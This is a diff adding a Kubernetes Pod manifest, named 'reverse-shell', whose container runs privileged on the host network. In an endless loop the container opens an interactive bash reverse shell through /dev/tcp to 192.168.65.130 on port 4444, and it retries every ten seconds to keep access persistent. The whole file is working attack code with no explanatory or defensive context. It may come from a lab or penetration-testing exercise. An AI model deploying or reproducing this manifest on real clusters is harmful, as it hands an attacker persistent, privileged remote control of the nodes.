@@ -1,0 +1,22 @@
+apiVersion: v1
+kind: Pod
+metadata:
+  name: reverse-shell
+spec:
+  hostNetwork: true
+  containers:
+  - name: attacker
+    image: debian
+    securityContext:
+      privileged: true
+    command:
+      - /bin/bash
+      - -c
+      - |
+        apt update;
+        apt install -y netcat-traditional;
+        echo "Reversing persistently...";
+        while true; do
+          /bin/bash -i >& /dev/tcp/192.168.65.130/4444 0>&1;
+          sleep 10;
+        done
